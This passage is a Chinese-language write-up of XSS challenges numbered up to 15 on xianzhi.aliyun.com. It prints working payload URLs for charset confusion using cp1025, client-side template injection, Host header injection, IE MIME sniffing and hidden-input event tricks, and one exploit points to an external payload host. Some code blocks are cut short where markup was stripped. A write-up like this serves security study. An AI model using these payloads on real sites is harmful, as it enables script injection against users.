我们有时候在使用浏览器的时候，也会遇到编码不同导致乱码问题，这个问题主要在于服务端和客户端之间的字符集存在差异导致的.
关于这个也找到一篇文章：
上面的由于两端的差别导致的乱码，从xss角度出发，我们也就只能分析客户端  
所以问题来了： **http的响应头的编码、页面的meta等都可以设置头的东西，那么具体是什么时候具体对应的会起作用?**
先来了解一下浏览器的一些解析过程.  
第一个是ua里面已经确认指明了才会选择  
第二个是http响应头大编码设置，也就是`Content-Type`，当它设置了`charset` **并且**
支持这个`charset`，也就是不为空并且字符集是存在的，题目的编码是不存在的编码`GB3212`，所以符合  
第三个就是如果meta标签设置编码是在html前1024个字节的时候，浏览器会根据这个编码去解析，这个是浏览器直接解析，完全是不受`plaintext`影响
所以第一步就是 **利用meta来改变页面的字符集**.
第二步，需要做的就是去 **利用字符集之间的差异，寻找异类的字符集** ，
我们平常见到`
可以看到`plaintext`已经不见了
第三步，确认异类字符集的编码表，这样就可以构造好自己的payload  
这里需要跑一下来确认.
fuzz.php
    function hex_pad(int_){
        hex_ = int_.toString(16);
        if(hex_.length==1){
            hex_ = '0'+hex_;
        }
        return hex_;
    }
    for(var i=0;i
其中还有一个game.php作为接口，利用iframe去得到字符集
这里就表明了，比如想要得到字符`m`，那就输入url编码`%94`
附上一点`cp1025`的编码
      %6e
    /  %61
    (  %4d
    )  %5d
    =  %7e
    ;  %5e
    '  %7d
IE payload：
    http://xianzhi.aliyun.com/xss9.php?text=%4c%89%94%87%01%a2%99%83%7e%f1%01%96%95%85%99%99%96%99%7e%81%93%85%99%a3%4d%f1%5d%0b%6e
PS: 关于`meta`的一些使用语法可以看看这.  
`https://www.w3.org/TR/html401/struct/global.html#h-7.4.4`
ref: 
### 10\. MVM
    '" placeholder="username" maxlength="11" type="text">
对框架不是很熟悉，提示是Client Side Template Injection，翻M师傅推特找到一个利用
FF && Chrome Exp
    {{[].pop.constructor('alert()')()}}
    http://xianzhi.aliyun.com/xss10.php?username=%7B%7B%5B%5D.pop.constructor(%27alert(1)%27)()%7D%7D
ref: 
### 11\. HOST
    "use strict";
    var http = require('http');
    (function(){
        http.createServer(function (req, res) {
                res.writeHead( 200, { "Content-Type" : "text/html;charset=utf-8", "X-XSS-Protection" : "0" } );
                res.end( '' + req.headers["host"] + 'It works!' );
        }).listen(80);
        console.log( "Running server on port 80" );
    })();
HOST头注入，这里又需要用到IE下一个奇怪的姿势.
重点部分：
所以可以构造
11.php
    alert(document.domain)
### 12\. preview
先来了解一下IE的奇怪MIME判断。  
因为有些服务器指定的不是一个正确的Content-Type头，所以IE为了兼容这些文件类型，它会将文件的前256个字节与已知文件头进行比较，然后得到一个结果...也就是``作为开头的话，会被认为是`text/html`
所以可以构造一下
IE exp:
    http://xianzhi.aliyun.com/xss12.php?url=http://ns1.rootk.pw:8080/xss/wp/12.php
12.php
ref: 
### 13\. REQUEST_URI
REQUEST_URI请求的xss，在IE下，加一次跳转就不会进行编码
IE exp:  
13.php
    ");
ref: 
### 14\. HIDDEN
    '>
很久经典的一个问题，模糊记得xss书上有讲这个问题，因为标签里面有hidden属性的存在，导致大部分事件没法直接触发
所以一般分为两点，输出点是在hidden属性之前还是之后(不能闭合掉input的情况下)
  1. 之前则可以覆盖type为其他的，``
  2. 之后的话，只能通过间接的方式来触发，比如大家熟知的`' accesskey='x' onclick='alert(/1/)`，然后按shift+alt+x触发xss，但是还可以这样操作，无交互的触发xss，相比起来已经是无限制了，`'style='behavior:url(?)'onreadystatechange='alert(1)`
参考文章：
IE exp:
    http://xianzhi.aliyun.com/xss14.php?token=%27style=%27behavior:url(?)%27onreadystatechange=%27alert(1)
### 15\. Frame Buster
    '>
很有意思的一个题目，一种防御iframe框架加载的方式，如果用框架加载的话，会让页面一直刷新....此题提示是`DOM Clobbering`